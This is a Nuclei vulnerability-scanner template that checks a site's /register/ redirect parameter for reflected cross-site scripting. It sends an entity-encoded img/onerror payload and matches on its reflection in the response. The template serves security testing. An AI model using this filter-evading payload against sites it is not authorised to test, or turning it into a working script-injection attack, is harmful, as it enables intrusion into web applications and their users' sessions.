id: kaue-xss-register

info:
  name: kauexsssregister
  author: kauenavarro
  severity: medium
  description: Procura por respostas refletidas.
  tags: xss
requests:
  - method: GET
    path:
      - "{{BaseURL}}/register/?redirect=%26%23%78%32%32%3b%26%23%78%33%65%3b%26%23%78%33%63%3b%26%23%78%36%39%3b%26%23%78%36%64%3b%26%23%78%36%37%3b%26%23%78%32%30%3b%26%23%78%37%33%3b%26%23%78%37%32%3b%26%23%78%36%33%3b%26%23%78%33%64%3b%26%23%78%37%38%3b%26%23%78%32%30%3b%26%23%78%36%66%3b%26%23%78%36%65%3b%26%23%78%36%35%3b%26%23%78%37%32%3b%26%23%78%37%32%3b%26%23%78%36%66%3b%26%23%78%37%32%3b%26%23%78%33%64%3b%26%23%78%37%30%3b%26%23%78%37%32%3b%26%23%78%36%66%3b%26%23%78%36%64%3b%26%23%78%37%30%3b%26%23%78%37%34%3b%26%23%78%32%38%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%64%3b%26%23%78%36%31%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%32%39%3b%26%23%78%33%62%3b%26%23%78%33%65%3b%26%23%78%32%65%3b%26%23%78%32%30%3b"
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "><img src=x onerror=prompt(document.domain);>"
        part: body
        condition: or

      - type: word
        words:
          - "text/html"
        part: header

      - type: word
        words:
          - "<title>Access Denied</title>"
          - "You don't have permission to access"
        part: body
        condition: and
        negative: true

      - type: status
        status:
          - 200
